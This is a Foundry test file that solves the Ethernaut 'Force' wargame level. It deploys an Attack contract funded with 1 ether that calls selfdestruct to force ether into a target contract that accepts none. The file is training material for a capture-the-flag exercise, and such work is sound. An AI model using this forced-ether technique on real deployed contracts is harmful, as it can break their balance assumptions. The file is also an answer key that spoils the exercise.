// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test, console} from "forge-std/Test.sol";
import {StdCheats} from "forge-std/StdCheats.sol";
import "../src/Force/ForceFactory.sol";
import "../src/Ethernaut.sol";

contract ForceTest is StdCheats, Test {
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testForceHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        ForceFactory forceFactory = new ForceFactory();
        ethernaut.registerLevel(forceFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(forceFactory);
        Force ethernautForce = Force(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        Attack attack = new Attack{value: 1 ether}(payable(address(ethernautForce)));
        attack.attack();

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract Attack {
    address payable target;

    constructor(address payable _target) payable {
        target = _target;
    }

    function attack() public {
        selfdestruct(target);
    }
}
